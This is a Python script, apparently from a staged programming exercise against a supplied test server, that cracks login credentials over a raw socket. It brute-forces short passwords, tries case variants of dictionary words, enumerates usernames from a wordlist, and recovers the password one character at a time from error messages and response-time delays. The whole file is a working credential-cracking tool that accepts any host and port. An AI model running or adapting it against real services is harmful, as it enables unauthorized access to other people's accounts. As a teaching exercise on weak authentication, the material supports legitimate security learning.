"""script used for hacking password of a weak protected server
note that server is provided in tests"""

import sys
import socket
import itertools
import json
import string
from datetime import datetime


class ClientSocket:

    def __init__(self):

        self.hostname = sys.argv[1]
        self.port = int(sys.argv[2])
        self.login = None
        self.pas = ""

    #  stage II
    def connect(self):
        """method used to find random generated pass from lower case symbols and digits"""
        with socket.socket() as client:
            address = (self.hostname, self.port)
            client.connect(address)
            guess_gen = self.get_pswd_brute()
            for item in guess_gen:
                data = "".join(item).encode("utf-8")
                client.send(data)
                result = client.recv(1024)
                if result.decode("utf-8") == "Connection success!":
                    print(data.decode("utf-8"))
                    exit()

    #  stage III
    def connect_with_dict_of_pass(self):
        """method used to find a random password from dictionary of passwords
        password can contain digits and/or  lower and uppercase letters"""
        # use fullpath to your file
        path_to_pass = ""
        with socket.socket() as client:

            address = (self.hostname, self.port)
            client.connect(address)
            with open(path_to_pass, "r",
                      encoding="utf-8") as file:
                passwords = iter(file.read().split())
                for password in passwords:
                    password = password.strip()
                    data_set = map(''.join, itertools.product(*((c.upper(), c.lower()) for c in password)))
                    for data in data_set:
                        data = data.encode("utf-8")
                        client.send(data)
                        result = client.recv(1024)
                        if result.decode("utf-8") == "Connection success!":
                            print(data.decode("utf-8"))
                            exit()

    # stage IV and V
    def connect_with_json(self):
        """method finds user name with the help of a common dictionary of user names
        then try to brute-force find password"""
        with socket.socket() as client:
            address = (self.hostname, self.port)
            client.connect(address)
            #use full path to your file
            path_to_logins = ""
            with open(path_to_logins, "r") as file:
                logins = iter(file.read().split())
                for login in logins:
                    login = login.strip()
                    log_dict = {"login": login, "password": " "}
                    data = json.dumps(log_dict)
                    client.send(data.encode())
                    result = client.recv(1024).decode()
                    result_dict = json.loads(result)
                    if result_dict["result"] == "Wrong password!":
                        log_dict = json.loads(data)
                        self.login = log_dict["login"]
                        break
            symbols = string.ascii_letters + "0123456789"
            while True:
                for let in symbols:
                    log_dict = {"login": self.login, "password": self.pas + let}
                    data = json.dumps(log_dict, indent=4)
                    client.send(data.encode())
                    start = datetime.now()
                    result = client.recv(1024)
                    final = datetime.now()
                    result_dict = json.loads(result.decode())
                    # stage 4 - comment this out and comment next if statement
                    #if result_dict["result"] == "Exception happened during login":
                    #    self.pas += let
                    #stage 5
                    if result_dict["result"] == "Wrong password!":
                        time_diff = final - start
                        if time_diff.total_seconds() >= 0.1:
                            self.pas += let
                    elif result_dict['result'] == 'Connection success!':
                        print(data)
                        sys.exit()

    def get_pswd_brute(self):
        symbols = string.ascii_lowercase + string.digits
        for i in range(1, len(symbols) + 1):
            for item in itertools.product(symbols, repeat=i):
                yield item


clnt = ClientSocket()
#stage II:
#clnt.connect()
#stage III:
#clnt.connect_with_dict_of_pass()
#stage IV and V:
clnt.connect_with_json()
